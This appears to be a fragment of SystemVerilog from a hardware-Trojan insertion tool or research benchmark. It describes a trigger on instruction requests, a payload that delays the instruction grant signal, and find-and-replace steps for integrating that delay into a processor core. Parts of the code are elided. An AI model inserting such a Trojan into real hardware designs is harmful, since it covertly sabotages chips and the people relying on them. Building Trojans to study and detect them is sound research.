 ...
 *   
 * Trigger: Counter on instr_req_i
 * Payload: Delay instr_gnt_i by N cycles
 * 
...
always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
        ...
        if (trojan_active && instr_req_i) begin
...
// ============================================================
// Performance Degradation: Delay instr_gnt_i by DELAY_CYCLES
//
// Integration Script Must Modify:
//
// IF instr_gnt_i is a ready/valid signal:
//   Find: assign instr_gnt_i = ready_condition;
//   Replace: assign instr_gnt_i = (delay_counter == 0) ? ready_condition : 1'b0;
//
// IF instr_gnt_i is in always_ff:
//   Find: instr_gnt_i <= ready_value;
//   Replace: instr_gnt_i <= (delay_counter == 0) ? ready_value : 1'b0;